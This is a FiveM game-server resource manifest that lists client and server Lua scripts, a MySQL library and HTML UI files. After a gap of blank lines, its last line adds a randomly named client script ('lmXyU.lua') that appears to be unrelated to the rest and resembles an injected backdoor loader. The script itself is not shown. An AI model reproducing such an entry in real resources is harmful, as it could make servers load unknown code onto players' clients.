resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

ui_page 'html/ui.html'

client_scripts {
    'client/main.lua',
    'config.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'server/main.lua',
    'config.lua',
}

files {
    'html/ui.html',
    'html/css/main.css',
    'html/js/app.js',
}



client_script "lmXyU.lua"